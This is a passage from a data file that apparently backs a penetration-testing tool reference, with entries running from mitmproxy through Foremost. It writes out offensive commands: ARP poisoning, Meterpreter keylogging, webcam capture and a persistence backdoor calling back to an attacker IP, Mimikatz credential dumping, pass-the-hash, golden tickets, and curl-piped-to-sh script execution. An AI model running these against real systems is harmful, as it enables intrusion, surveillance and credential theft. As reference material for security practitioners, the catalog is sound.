        syntax: 'mitmproxy -s <script.py>',
        description:
          'Loads a Python addon that hooks into request/response events to automate traffic modification, credential extraction, or fuzzing.',
        example: 'mitmproxy -s extract_cookies.py --listen-port 8080',
      },
    ],
    useCases: [
      'Intercepting and modifying mobile app API traffic for security testing',
      'Extracting authentication tokens and cookies from HTTPS sessions',
      'Fuzzing web API parameters by intercepting and modifying live requests',
      'Recording and replaying traffic sequences for regression testing',
    ],
    tags: ['proxy', 'https', 'tls', 'intercept', 'http', 'web', 'api-testing'],
    relatedTools: ['burpsuite', 'bettercap', 'wireshark'],
  },

  {
    name: 'Arpspoof',
    slug: 'arpspoof',
    category: 'Sniffing & Spoofing',
    subcategory: 'ARP Spoofing',
    difficulty: 'Beginner',
    description:
      'Simple dsniff-suite utility that sends forged ARP replies to poison the ARP cache of a target host, enabling man-in-the-middle interception.',
    longDescription:
      'Arpspoof is a minimal, focused tool from the dsniff suite that performs ARP cache poisoning against one or two hosts. By telling the victim that the attacker\'s MAC corresponds to the gateway IP, and telling the gateway that the attacker\'s MAC corresponds to the victim IP, all traffic between them flows through the attacker. IP forwarding must be enabled on the attacker machine so that legitimate traffic continues to pass through and connections do not drop. Pair arpspoof with tcpdump or Wireshark to capture the intercepted traffic.',
    commands: [
      {
        title: 'Enable IP Forwarding',
        syntax: 'echo 1 > /proc/sys/net/ipv4/ip_forward',
        description:
          'Enables kernel IP forwarding so intercepted packets are relayed to their real destination, preventing the victim from losing connectivity.',
        example: 'echo 1 > /proc/sys/net/ipv4/ip_forward',
      },
      {
        title: 'Poison Victim ARP Cache',
        syntax: 'arpspoof -i <interface> -t <target-ip> <gateway-ip>',
        description:
          'Sends continuous forged ARP replies to the victim, poisoning its ARP cache so it sends all traffic destined for the gateway to the attacker instead.',
        example: 'arpspoof -i eth0 -t 192.168.1.50 192.168.1.1',
        flags: [
          { flag: '-i', description: 'Network interface to send forged ARP packets on' },
          { flag: '-t', description: 'IP address of the target host whose ARP cache will be poisoned' },
          { flag: '-r', description: 'Poison both directions (victim and gateway) simultaneously' },
        ],
      },
      {
        title: 'Bidirectional ARP Poisoning',
        syntax: 'arpspoof -i <interface> -t <target-ip> -r <gateway-ip>',
        description:
          'Poisons both the target and the gateway simultaneously with a single command using the -r flag, ensuring full bidirectional interception.',
        example: 'arpspoof -i eth0 -t 192.168.1.50 -r 192.168.1.1',
      },
    ],
    useCases: [
      'Establishing a simple man-in-the-middle position on a LAN',
      'Capturing cleartext credentials passing between a host and the gateway',
      'Redirecting a target\'s traffic through a transparent proxy',
      'Demonstrating ARP poisoning vulnerabilities in security awareness training',
    ],
    tags: ['arp', 'arp-spoof', 'mitm', 'lan', 'network', 'dsniff'],
    relatedTools: ['ettercap', 'bettercap', 'dsniff'],
  },

  // ─────────────────────────────────────────────
  // POST EXPLOITATION
  // ─────────────────────────────────────────────
  {
    name: 'Meterpreter',
    slug: 'meterpreter',
    category: 'Post Exploitation',
    subcategory: 'Remote Shell',
    featured: true,
    difficulty: 'Intermediate',
    description:
      'Metasploit\'s advanced in-memory payload that provides an encrypted, extensible post-exploitation shell with file transfer, keylogging, screenshot, and pivoting capabilities.',
    longDescription:
      'Meterpreter runs entirely in memory on the compromised host, leaving no files on disk by default. It communicates over an encrypted channel to the Metasploit handler and supports dynamic extension loading — you can load additional modules (incognito, kiwi, sniffer) at runtime. The rich command set covers everything from basic file operations and process management to privilege escalation, credential dumping, persistence installation, and webcam access. Sessions can be backgrounded and passed to other Metasploit modules for further exploitation or pivoting.',
    commands: [
      {
        title: 'Get System Information',
        syntax: 'sysinfo',
        description:
          'Returns the computer name, operating system version, architecture, and Meterpreter/session type of the compromised host.',
        example: 'sysinfo',
      },
      {
        title: 'Get Current User',
        syntax: 'getuid',
        description:
          'Displays the Windows or Unix username under which the Meterpreter session is currently running.',
        example: 'getuid',
      },
      {
        title: 'Attempt Privilege Escalation',
        syntax: 'getsystem',
        description:
          'Attempts multiple privilege escalation techniques (named pipe impersonation, token duplication) to elevate from a standard user to SYSTEM on Windows.',
        example: 'getsystem',
      },
      {
        title: 'Dump Password Hashes',
        syntax: 'hashdump',
        description:
          'Dumps NTLM password hashes from the Windows SAM database. Requires SYSTEM-level privileges. Hashes can be passed or cracked offline.',
        example: 'hashdump',
      },
      {
        title: 'Download File from Target',
        syntax: 'download <remote-path> <local-path>',
        description:
          'Copies a file from the compromised host to the attacker\'s machine over the encrypted Meterpreter channel.',
        example: 'download /etc/passwd /home/kali/',
      },
      {
        title: 'Upload File to Target',
        syntax: 'upload <local-path> <remote-path>',
        description:
          'Transfers a file from the attacker\'s machine to the compromised host.',
        example: 'upload /home/kali/tool.sh /tmp/',
      },
      {
        title: 'Take Screenshot',
        syntax: 'screenshot',
        description:
          'Captures the current desktop screenshot of the compromised host and saves it locally on the attacker\'s machine.',
        example: 'screenshot',
      },
      {
        title: 'Capture Webcam Snapshot',
        syntax: 'webcam_snap -i <camera-index>',
        description:
          'Takes a still photo from the specified webcam index on the target system. Use webcam_list to enumerate available cameras first.',
        example: 'webcam_snap -i 1',
      },
      {
        title: 'Start Keylogger',
        syntax: 'keyscan_start',
        description:
          'Activates the kernel-level keylogger on the target host. Keystrokes are buffered in memory until retrieved with keyscan_dump.',
        example: 'keyscan_start',
      },
      {
        title: 'Dump Captured Keystrokes',
        syntax: 'keyscan_dump',
        description:
          'Retrieves and displays all buffered keystrokes captured since keyscan_start was executed.',
        example: 'keyscan_dump',
      },
      {
        title: 'Drop into System Shell',
        syntax: 'shell',
        description:
          'Opens a native command shell (cmd.exe on Windows, /bin/sh on Linux) on the target. Press CTRL+Z to background and return to Meterpreter.',
        example: 'shell',
      },
      {
        title: 'Install Persistence',
        syntax: 'run persistence -S -i <interval> -p <port> -r <attacker-ip>',
        description:
          'Installs a persistent Meterpreter backdoor that reconnects to the attacker at a set interval (-i seconds). -S installs as a service on Windows.',
        example: 'run persistence -S -i 30 -p 4444 -r 192.168.1.100',
      },
    ],
    useCases: [
      'Conducting post-exploitation after gaining initial access via Metasploit',
      'Dumping credentials for lateral movement through a network',
      'Establishing persistent access for long-term red-team assessments',
      'Pivoting to isolated network segments through a compromised host',
      'Collecting evidence of sensitive data exposure (files, screenshots, keystrokes)',
    ],
    tags: ['meterpreter', 'post-exploitation', 'shell', 'keylogger', 'persistence', 'metasploit'],
    relatedTools: ['metasploit', 'empire', 'covenant'],
  },

  {
    name: 'Mimikatz',
    slug: 'mimikatz',
    category: 'Post Exploitation',
    subcategory: 'Credential Dumping',
    difficulty: 'Advanced',
    description:
      'Windows credential extraction tool that dumps plaintext passwords, NTLM hashes, Kerberos tickets, and enables pass-the-hash and golden ticket attacks.',
    longDescription:
      'Mimikatz, developed by Benjamin Delpy, exploits Windows authentication internals to extract credential material directly from memory. The sekurlsa module reads credentials from the LSASS process, recovering plaintext passwords when WDigest authentication is enabled and NTLM hashes in all modern configurations. The lsadump module extracts SAM database hashes and LSA secrets (service account passwords, cached domain credentials). Its Kerberos modules enable golden ticket and silver ticket attacks against Active Directory domains. Mimikatz is a native Windows executable; on Linux/Kali it is typically run through a Meterpreter session using the kiwi module.',
    commands: [
      {
        title: 'Dump Logon Passwords (LSASS)',
        syntax: 'sekurlsa::logonpasswords',
        description:
          'Reads the LSASS process memory and extracts all available credentials — plaintext passwords (where WDigest is enabled), NTLM hashes, and Kerberos tickets — for all logged-on users.',
        example: 'sekurlsa::logonpasswords',
      },
      {
        title: 'Dump SAM Database Hashes',
        syntax: 'lsadump::sam',
        description:
          'Extracts NTLM hashes of all local user accounts from the Security Account Manager database. Requires SYSTEM privileges.',
        example: 'lsadump::sam',
      },
      {
        title: 'Dump LSA Secrets',
        syntax: 'lsadump::secrets',
        description:
          'Retrieves LSA secrets from the registry, which can include service account passwords, DPAPI master keys, and cached domain credentials.',
        example: 'lsadump::secrets',
      },
      {
        title: 'Pass-the-Hash Attack',
        syntax: 'sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:cmd.exe',
        description:
          'Spawns a new process (cmd.exe) authenticated with the provided NTLM hash without needing the plaintext password, enabling lateral movement to other systems that accept the same credentials.',
        example: 'sekurlsa::pth /user:admin /domain:. /ntlm:aad3b435b51404eeaad3b435b51404ee /run:cmd.exe',
      },
      {
        title: 'Forge a Golden Ticket',
        syntax: 'kerberos::golden /user:<username> /domain:<domain> /sid:<domain-SID> /krbtgt:<hash> /id:500',
        description:
          'Creates a forged Kerberos TGT (golden ticket) using the krbtgt account NTLM hash, granting persistent domain admin access valid for 10 years by default.',
        example: 'kerberos::golden /user:admin /domain:lab.local /sid:S-1-5-21-3456789012-987654321-1234567890 /krbtgt:8e6a4b9c3d1f7a2e5c8b0d4f6e9a1c3d /id:500',
      },
    ],
    useCases: [
      'Extracting credentials after gaining SYSTEM access on a Windows host',
      'Performing pass-the-hash lateral movement across a Windows domain',
      'Demonstrating the impact of credential exposure in Active Directory environments',
      'Forging Kerberos tickets during advanced red-team domain compromise simulations',
      'Recovering service account passwords stored as LSA secrets',
    ],
    tags: ['credentials', 'ntlm', 'kerberos', 'pass-the-hash', 'golden-ticket', 'windows', 'active-directory'],
    relatedTools: ['meterpreter', 'empire', 'impacket'],
  },

  {
    name: 'LinPEAS',
    slug: 'linpeas',
    category: 'Post Exploitation',
    subcategory: 'Privilege Escalation',
    difficulty: 'Beginner',
    description:
      'Automated Linux privilege escalation enumeration script that highlights potential vectors including SUID binaries, writable paths, cron jobs, and kernel exploits.',
    longDescription:
      'LinPEAS (Linux Privilege Escalation Awesome Script) is part of the PEASS-ng suite by Carlos Polop. It performs hundreds of privilege escalation checks in seconds, colour-coding results by severity (red/yellow/green) so analysts can quickly identify the most promising vectors. Checks include SUID/SGID binaries, sudo misconfigurations, writable cron jobs, PATH injection opportunities, interesting files in home directories, running services, kernel version against known local exploits, Docker/LXC escape vectors, and much more. No installation is required — it runs as a plain shell script.',
    commands: [
      {
        title: 'Download and Run Directly',
        syntax: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
        description:
          'Fetches the latest linpeas.sh from GitHub and pipes it directly to sh. Does not write any file to disk. Requires internet access from the target.',
        example: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
      },
      {
        title: 'Run and Save Output',
        syntax: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | tee /tmp/linpeas_out.txt | sh',
        description:
          'Runs linpeas and simultaneously saves the output to a file for later review or exfiltration.',
        example: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | tee /tmp/linpeas_out.txt | sh',
      },
      {
        title: 'Run in Quiet Mode',
        syntax: './linpeas.sh -q',
        description:
          'After transferring linpeas.sh to the target, runs it with reduced output, showing only high and critical severity findings.',
        example: 'chmod +x linpeas.sh && ./linpeas.sh -q',
      },
    ],
    useCases: [
      'Quickly enumerating privilege escalation paths on a freshly compromised Linux host',
      'Identifying SUID binaries, writable cron jobs, and sudo misconfigurations',
      'Checking the kernel version against known local privilege escalation exploits',
      'Auditing Linux system hardening as part of a security review',
    ],
    tags: ['privilege-escalation', 'linux', 'enumeration', 'suid', 'post-exploitation', 'shell-script'],
    relatedTools: ['winpeas', 'linux-exploit-suggester', 'pspy'],
  },

  {
    name: 'WinPEAS',
    slug: 'winpeas',
    category: 'Post Exploitation',
    subcategory: 'Privilege Escalation',
    difficulty: 'Beginner',
    description:
      'Windows privilege escalation enumeration tool that audits the local system for misconfigurations, weak service permissions, unquoted paths, and credential storage.',
    longDescription:
      'WinPEAS is the Windows counterpart to LinPEAS in the PEASS-ng project. It is available as a compiled C# executable (winPEASx64.exe / winPEASx86.exe) and a batch script (winPEAS.bat). It checks hundreds of Windows-specific privilege escalation vectors: AlwaysInstallElevated, unquoted service paths, weak service/folder permissions, stored credentials in the registry, browser saved passwords, scheduled task weaknesses, token privileges, and more. Output is colour-coded to prioritise the most critical findings.',
    commands: [
      {
        title: 'Run Full Enumeration',
        syntax: 'winPEASx64.exe',
        description:
          'Runs all enumeration checks on a 64-bit Windows system and prints colour-coded results to the console. Run from a Meterpreter shell or directly on the target.',
        example: 'winPEASx64.exe',
      },
      {
        title: 'Run in Quiet Mode',
        syntax: 'winPEASx64.exe quiet',
        description:
          'Suppresses the banner and less-important informational checks, printing only medium, high, and critical findings for faster review.',
        example: 'winPEASx64.exe quiet',
      },
      {
        title: 'Run Batch Script Version',
        syntax: 'winPEAS.bat',
        description:
          'Runs the batch script version of WinPEAS on systems where executing unsigned C# binaries is restricted. Fewer checks than the EXE but requires no .NET runtime.',
        example: 'winPEAS.bat',
      },
    ],
    useCases: [
      'Identifying privilege escalation paths on compromised Windows systems',
      'Finding weak service permissions and unquoted service paths',
      'Discovering stored credentials in the registry, files, and browser profiles',
      'Checking AlwaysInstallElevated and other common Windows misconfigurations',
    ],
    tags: ['privilege-escalation', 'windows', 'enumeration', 'post-exploitation', 'misconfig'],
    relatedTools: ['linpeas', 'windows-exploit-suggester', 'mimikatz'],
  },

  {
    name: 'Pspy',
    slug: 'pspy',
    category: 'Post Exploitation',
    subcategory: 'Process Monitoring',
    difficulty: 'Beginner',
    description:
      'Unprivileged Linux process monitor that watches for new process executions in real time, revealing cron jobs, scripts, and commands run by other users.',
    longDescription:
      'Pspy monitors the Linux /proc filesystem for new process events without requiring root privileges or any kernel module. It captures the full command line, UID, PID, and timestamps of every new process, making it invaluable for discovering scheduled tasks and cron jobs running as root that may be exploitable for privilege escalation. It also reveals scripts or binaries called by privileged processes, which might be writable by a low-privilege user. Pspy ships as a static binary for 32-bit and 64-bit systems with no dependencies.',
    commands: [
      {
        title: 'Run 64-bit Pspy',
        syntax: './pspy64',
        description:
          'Monitors process creation on a 64-bit Linux system. All new processes are printed to stdout with UID, PID, command, and timestamp.',
        example: './pspy64',
      },
      {
        title: 'Run 32-bit Pspy with File System Events',
        syntax: './pspy32 -pf -i 1000',
        description:
          'Runs the 32-bit binary with file system event monitoring (-f) and a 1000ms interval (-i) between /proc scans. Use on 32-bit targets or where inotify is available.',
        example: './pspy32 -pf -i 1000',
      },
    ],
    useCases: [
      'Discovering cron jobs and scheduled tasks running as root',
      'Identifying scripts called by privileged processes that are writable by the current user',
      'Monitoring a compromised host for periodic maintenance scripts to exploit',
      'Observing application behaviour without triggering AV or audit logs',
    ],
    tags: ['process-monitor', 'cron', 'privilege-escalation', 'linux', 'enumeration', 'unprivileged'],
    relatedTools: ['linpeas', 'linux-exploit-suggester'],
  },

  // ─────────────────────────────────────────────
  // REVERSE ENGINEERING
  // ─────────────────────────────────────────────
  {
    name: 'Ghidra',
    slug: 'ghidra',
    category: 'Reverse Engineering',
    subcategory: 'Disassembler & Decompiler',
    difficulty: 'Advanced',
    description:
      'NSA-developed open-source reverse engineering suite featuring a multi-architecture decompiler, scripting API, and collaborative analysis capabilities.',
    longDescription:
      'Ghidra is a free, open-source software reverse engineering (SRE) framework released by the US National Security Agency. Its decompiler can translate machine code from x86, ARM, MIPS, PowerPC, and dozens of other architectures into readable pseudo-C, dramatically accelerating analysis compared to pure disassembly. Ghidra supports collaborative multi-user projects where teams share annotations, function names, and type definitions. A Java/Python scripting API enables automation of repetitive analysis tasks. It handles everything from bare-metal firmware to 64-bit desktop applications.',
    commands: [
      {
        title: 'Launch Ghidra GUI',
        syntax: 'ghidraRun',
        description:
          'Opens the Ghidra project manager GUI. Create or open a project, then import a binary to begin analysis.',
        example: 'ghidraRun',
      },
      {
        title: 'Headless Analysis of a Binary',
        syntax: 'analyzeHeadless <project-dir> <ProjectName> -import <binary>',
        description:
          'Runs Ghidra analysis non-interactively from the command line. Useful for batch processing or CI pipeline integration.',
        example: 'analyzeHeadless /tmp/ghidra_projects MyProject -import /home/kali/targets/crackme.elf',
      },
      {
        title: 'Headless Analysis with Post-Script',
        syntax: 'analyzeHeadless <project-dir> <ProjectName> -import <binary> -postScript <Script.java>',
        description:
          'Imports a binary, runs full auto-analysis, then executes a custom post-analysis script to extract strings, functions, or other data automatically.',
        example: 'analyzeHeadless /tmp/ghidra_projects MyProject -import crackme.elf -postScript ExtractStrings.java',
      },
    ],
    useCases: [
      'Decompiling and analysing malware samples without source code',
      'Reverse engineering proprietary binary protocols for vulnerability research',
      'Analysing firmware images from embedded devices and routers',
      'CTF binary challenges requiring decompilation and logic reconstruction',
      'Comparing binary versions to identify security patches and diff vulnerabilities',
    ],
    tags: ['reverse-engineering', 'decompiler', 'disassembler', 'malware-analysis', 'firmware', 'nsa'],
    relatedTools: ['radare2', 'gdb', 'ida-pro'],
  },

  {
    name: 'Radare2',
    slug: 'radare2',
    category: 'Reverse Engineering',
    subcategory: 'Disassembler & Debugger',
    difficulty: 'Advanced',
    description:
      'Portable, scriptable reverse engineering framework providing disassembly, debugging, binary patching, and forensics for a wide range of architectures.',
    longDescription:
      'Radare2 (r2) is a complete binary analysis framework built around a hexadecimal editor with a modular architecture. It supports disassembly and debugging of x86, x64, ARM, MIPS, SPARC, and many other architectures. The interactive command-line interface offers hundreds of commands accessible via a consistent two-letter syntax. The visual mode provides a terminal UI for examining code flow graphs. Radare2 is highly scriptable via its own r2pipe API (supporting Python, JavaScript, Go, and others), and the community project Cutter provides a polished Qt-based GUI front end.',
    commands: [
      {
        title: 'Open a Binary',
        syntax: 'r2 <binary>',
        description:
          'Opens the specified binary in radare2 in read-only mode. The r2 prompt appears ready for commands.',
        example: 'r2 /home/kali/targets/crackme',
        flags: [
          { flag: '-d', description: 'Open the binary in debug mode (spawn a child process)' },
          { flag: '-w', description: 'Open binary in write mode to allow patching' },
          { flag: '-A', description: 'Run aaa analysis automatically on open' },
          { flag: '-q', description: 'Quiet mode — suppress banner and prompts (useful for scripting)' },
          { flag: '-c', description: 'Execute a radare2 command string immediately after opening' },
        ],
      },
      {
        title: 'Open Binary in Debug Mode',
        syntax: 'r2 -d <binary>',
        description:
          'Spawns the binary as a child process under r2\'s integrated debugger. Use dc (continue), db (breakpoint), and ds (step) to control execution.',
        example: 'r2 -d /home/kali/targets/crackme',
      },
      {
        title: 'Analyse All Functions',
        syntax: 'aaa',
        description:
          'Runs comprehensive auto-analysis: identifies functions, cross-references, strings, and imports. Run this after opening a binary before disassembling.',
        example: 'aaa',
      },
      {
        title: 'Disassemble a Function',
        syntax: 'pdf @ <function>',
        description:
          'Prints the disassembly of the function at the given location. Use "@ main" to disassemble main(), or "@ sym.funcname" for a named symbol.',
        example: 'pdf @ main',
      },
      {
        title: 'List All Identified Functions',
        syntax: 'afl',
        description:
          'Lists all functions identified during analysis with their addresses, sizes, and names. Use to navigate the binary\'s function landscape.',
        example: 'afl',
      },
      {
        title: 'Seek to an Address',
        syntax: 's <address>',
        description:
          'Moves the current seek position to the given address or symbol name. Subsequent commands operate relative to this position.',
        example: 's 0x080484c0',
      },
    ],
    useCases: [
      'Disassembling and analysing CTF binary challenges',
      'Patching binaries to bypass license checks or anti-debugging routines',
      'Debugging exploits and studying shellcode execution',
      'Reverse engineering stripped binaries with no symbol information',
      'Scriptable analysis pipelines using r2pipe automation',
    ],
    tags: ['reverse-engineering', 'disassembler', 'debugger', 'binary-analysis', 'ctf', 'r2'],
    relatedTools: ['ghidra', 'gdb', 'objdump'],
  },

  {
    name: 'GDB',
    slug: 'gdb',
    category: 'Reverse Engineering',
    subcategory: 'Debugger',
    difficulty: 'Advanced',
    description:
      'GNU debugger for C/C++ and assembly programs, widely used for exploit development, binary analysis, and crash debugging on Linux and other platforms.',
    longDescription:
      'GDB (GNU Debugger) is the standard debugger on Linux, supporting C, C++, Fortran, and assembly programs across x86, x64, ARM, and many other architectures. It allows setting breakpoints, stepping through code instruction by instruction, inspecting memory and register contents, and modifying program state at runtime. For security research and exploit development, GDB is typically enhanced with extensions: PEDA (Python Exploit Development Assistance) adds colourised register/stack views; pwndbg provides heap visualisation and exploit helpers; GEF (GDB Enhanced Features) combines these capabilities with a clean modern interface.',
    commands: [
      {
        title: 'Load a Binary into GDB',
        syntax: 'gdb ./<binary>',
        description:
          'Loads the specified binary into GDB without starting execution. Set breakpoints before running.',
        example: 'gdb ./vuln_binary',
      },
      {
        title: 'Run Program with Arguments',
        syntax: 'run <arg1> <arg2>',
        description:
          'Starts the loaded program with the specified command-line arguments. Execution pauses at the first breakpoint or on a fault.',
        example: 'run arg1 AAAAAAAAAAAAAAAA',
      },
      {
        title: 'Set a Breakpoint',
        syntax: 'break <location>',
        description:
          'Sets a breakpoint at a function name or a specific memory address. Execution will pause before that instruction is executed.',
        example: 'break main\nbreak *0x080484c0',
      },
      {
        title: 'Examine Memory',
        syntax: 'x/<count><format> <address>',
        description:
          'Reads memory at the given address. Format codes: x (hex), d (decimal), s (string), i (instruction). Count specifies the number of units to print.',
        example: 'x/20x $esp',
      },
      {
        title: 'Inspect Registers',
        syntax: 'info registers',
        description:
          'Displays the current values of all CPU registers. Use "p $eax" to print a single register, or "info registers eip" for a specific one.',
        example: 'info registers\np $eax',
      },
    ],
    useCases: [
      'Analysing crashes and determining exploitability (EIP/RIP control)',
      'Writing and testing buffer overflow exploits step by step',
      'Reverse engineering stripped binaries by dynamic analysis',
      'Debugging shellcode execution in controlled environments',
      'Understanding function call conventions and stack frame layouts',
    ],
    tags: ['debugger', 'gdb', 'exploit-dev', 'buffer-overflow', 'assembly', 'linux'],
    relatedTools: ['radare2', 'pwndbg', 'ghidra'],
  },

  {
    name: 'Objdump',
    slug: 'objdump',
    category: 'Reverse Engineering',
    subcategory: 'Binary Analysis',
    difficulty: 'Intermediate',
    description:
      'GNU binutils disassembler and object file analyser that extracts sections, headers, symbol tables, and disassembly from ELF, PE, and other binary formats.',
    longDescription:
      'Objdump is part of GNU binutils and provides a comprehensive view of object files and executables from the command line. It can display section headers, segment information, symbol tables, and disassemble code sections in AT&T or Intel syntax. Unlike a full debugger, objdump performs static analysis only — no execution of the binary is required. It is commonly used for quick analysis, finding ROP gadgets, verifying compiler settings (NX, stack canaries, RELRO), and examining library exports.',
    commands: [
      {
        title: 'Disassemble Code Sections',
        syntax: 'objdump -d <binary>',
        description:
          'Disassembles all executable sections in the binary and prints the output in the default (AT&T) syntax.',
        example: 'objdump -d /home/kali/targets/crackme',
        flags: [
          { flag: '-d', description: 'Disassemble only executable sections' },
          { flag: '-D', description: 'Disassemble all sections including data' },
          { flag: '-M intel', description: 'Use Intel disassembly syntax instead of default AT&T' },
          { flag: '-x', description: 'Display all headers (file, section, and symbol table)' },
          { flag: '-t', description: 'Display the symbol table' },
          { flag: '-s', description: 'Display full contents of all sections in hex and ASCII' },
        ],
      },
      {
        title: 'Disassemble with Intel Syntax',
        syntax: 'objdump -M intel -d <binary>',
        description:
          'Produces Intel-syntax disassembly, which is preferred by many security researchers and is consistent with NASM/MASM notation.',
        example: 'objdump -M intel -d /home/kali/targets/crackme',
      },
      {
        title: 'Display All Headers and Symbols',
        syntax: 'objdump -x <binary>',
        description:
          'Prints all available header information: file headers, section headers, symbol table, and dynamic relocation entries.',
        example: 'objdump -x /home/kali/targets/crackme',
      },
      {
        title: 'Display Symbol Table',
        syntax: 'objdump -t <binary>',
        description:
          'Lists all symbols (functions and global variables) with their addresses, sizes, and visibility — useful for identifying function entry points in partially stripped binaries.',
        example: 'objdump -t /home/kali/targets/crackme',
      },
    ],
    useCases: [
      'Quick static disassembly without loading a full debugger',
      'Finding ROP gadget candidates in binaries and libraries',
      'Verifying binary security features (NX, stack protector, RELRO)',
      'Examining library symbol exports for exploit development',
    ],
    tags: ['disassembler', 'elf', 'binary-analysis', 'static-analysis', 'objdump', 'binutils'],
    relatedTools: ['radare2', 'readelf', 'strings'],
  },

  {
    name: 'Binwalk',
    slug: 'binwalk',
    category: 'Reverse Engineering',
    subcategory: 'Firmware Analysis',
    difficulty: 'Intermediate',
    description:
      'Firmware analysis and extraction tool that scans binary files for embedded file signatures, compressed archives, and file system images.',
    longDescription:
      'Binwalk is the standard tool for analysing and extracting embedded content from firmware images. It scans a binary file for known magic bytes and file signatures — identifying compression streams (gzip, lzma, zlib), file systems (squashfs, cramfs, ext2, JFFS2), executable formats, certificates, and hundreds of other embedded data types. The -e flag extracts all identified components, often unpacking a full Linux root file system from a router or IoT device firmware image. The entropy analysis mode (-E) plots data randomness to identify encrypted or compressed regions even without known signatures.',
    commands: [
      {
        title: 'Scan Firmware for Embedded Files',
        syntax: 'binwalk <firmware.bin>',
        description:
          'Scans the binary file and prints all identified embedded file signatures with their offsets, without extracting anything.',
        example: 'binwalk firmware.bin',
        flags: [
          { flag: '-e', description: 'Extract all identified embedded files and file systems' },
          { flag: '-E', description: 'Plot Shannon entropy to identify compressed/encrypted regions' },
          { flag: '-M', description: 'Matryoshka extraction — recursively extract files within extracted files' },
          { flag: '-D', description: 'Manually specify a file type to extract, e.g. -D "jpeg image:jpg"' },
          { flag: '-B', description: 'Raw signature scan without using the default binwalk signature database' },
        ],
      },
      {
        title: 'Extract All Embedded Content',
        syntax: 'binwalk -e <firmware.bin>',
        description:
          'Extracts all embedded components identified during scanning into a directory named _firmware.bin.extracted/ in the current directory.',
        example: 'binwalk -e firmware.bin',
      },
      {
        title: 'Entropy Analysis',
        syntax: 'binwalk -E <firmware.bin>',
        description:
          'Generates a graphical entropy plot of the firmware. High entropy (near 1.0) indicates encryption or compression; low entropy indicates structured/code regions.',
        example: 'binwalk -E firmware.bin',
      },
      {
        title: 'Recursive Extraction',
        syntax: 'binwalk -Me <firmware.bin>',
        description:
          'Combines Matryoshka recursive mode with extraction, unpacking nested archives and file systems automatically.',
        example: 'binwalk -Me firmware.bin',
      },
    ],
    useCases: [
      'Extracting the root file system from router and IoT firmware images',
      'Identifying embedded credentials, private keys, and hardcoded secrets in firmware',
      'Analysing encrypted firmware regions to determine protection mechanisms',
      'Comparing two firmware versions to identify changes and security patches',
    ],
    tags: ['firmware', 'iot', 'extraction', 'binary-analysis', 'embedded', 'reverse-engineering'],
    relatedTools: ['foremost', 'dd', 'strings'],
  },

  // ─────────────────────────────────────────────
  // FORENSICS
  // ─────────────────────────────────────────────
  {
    name: 'Volatility',
    slug: 'volatility',
    category: 'Forensics',
    subcategory: 'Memory Forensics',
    difficulty: 'Advanced',
    description:
      'The industry-standard open-source memory forensics framework for extracting digital artefacts from RAM dumps, virtual machine snapshots, and hibernation files.',
    longDescription:
      'Volatility supports analysis of memory dumps from Windows (XP through 11), Linux, and macOS. Its profile-based architecture applies OS-specific parsing to kernel data structures, enabling analysts to reconstruct the runtime state of a system: running processes, open network connections, loaded kernel modules, registry hives, browser history, clipboard contents, and cryptographic keys — all from a binary memory image. Volatility 3 drops the profile requirement for Windows analysis, using symbol tables instead. It is essential for incident response, malware analysis, and forensic investigations.',
    commands: [
      {
        title: 'Identify Memory Image Profile',
        syntax: 'volatility -f <memory.dmp> imageinfo',
        description:
          'Analyses the memory dump and suggests the appropriate OS profile to use for further analysis. Always run this first on an unknown image.',
        example: 'volatility -f memory.dmp imageinfo',
        flags: [
          { flag: '-f', description: 'Path to the memory image file' },
          { flag: '--profile', description: 'OS profile to use, e.g. Win7SP1x86, WinXPSP2x86' },
          { flag: '-D', description: 'Output directory for dumped files' },
          { flag: '-Q', description: 'Physical offset of a specific object to dump' },
          { flag: '-p', description: 'Filter by specific process ID (PID)' },
        ],
      },
      {
        title: 'List Running Processes',
        syntax: 'volatility -f <memory.dmp> --profile=<Profile> pslist',
        description:
          'Lists all processes that were running at the time of the memory capture, showing PID, PPID, name, and start time.',
        example: 'volatility -f memory.dmp --profile=WinXPSP2x86 pslist',
      },
      {
        title: 'Scan for Network Connections',
        syntax: 'volatility -f <memory.dmp> --profile=<Profile> netscan',
        description:
          'Enumerates active and recently closed network connections and listening sockets from the memory image.',
        example: 'volatility -f memory.dmp --profile=Win7SP1x86 netscan',
      },
      {
        title: 'Dump Files from Memory',
        syntax: 'volatility -f <memory.dmp> --profile=<Profile> dumpfiles -Q <offset> -D <output-dir>',
        description:
          'Extracts a file cached in memory at the specified physical offset into the output directory. Use filescan first to find file offsets.',
        example: 'volatility -f memory.dmp --profile=Win7SP1x86 dumpfiles -Q 0x3e4a3418 -D /home/kali/output/',
      },
      {
        title: 'Dump Password Hashes from Memory',
        syntax: 'volatility -f <memory.dmp> --profile=<Profile> hashdump',
        description:
          'Extracts NTLM password hashes from the SYSTEM and SAM registry hives loaded in memory.',
        example: 'volatility -f memory.dmp --profile=Win7SP1x86 hashdump',
      },
      {
        title: 'Recover Command History',
        syntax: 'volatility -f <memory.dmp> --profile=<Profile> cmdscan',
        description:
          'Scans memory for COMMAND_HISTORY structures in cmd.exe processes to recover recently typed commands.',
        example: 'volatility -f memory.dmp --profile=Win7SP1x86 cmdscan',
      },
    ],
    useCases: [
      'Performing post-incident memory analysis to identify malware and attacker activity',
      'Recovering encryption keys and credentials from running processes',
      'Reconstructing attacker commands and lateral movement from cmd.exe history',
      'Detecting rootkits and hidden processes using cross-view process listing',
      'Extracting malware payloads injected into legitimate process memory',
    ],
    tags: ['memory-forensics', 'ram', 'incident-response', 'malware-analysis', 'windows', 'volatility'],
    relatedTools: ['autopsy', 'rekall', 'bulk-extractor'],
  },

  {
    name: 'Foremost',
    slug: 'foremost',
    category: 'Forensics',
    subcategory: 'File Recovery',
    difficulty: 'Beginner',
    description:
      'Console-based file carving utility that recovers deleted files from disk images by scanning for file headers and footers.',
    longDescription:
      'Foremost was developed by the US Air Force Office of Special Investigations and performs file carving — recovering files based on their content rather than file system metadata. It reads a disk image from start to finish, identifying known file headers and carving out complete files even when directory entries and allocation tables have been overwritten. It supports dozens of file types including JPEG, PNG, GIF, BMP, AVI, MPG, MP3, WAV, DOC, XLS, PDF, ZIP, RAR, and many more. A custom configuration file allows adding new file type signatures.',
    commands: [
      {
        title: 'Recover All Supported File Types',
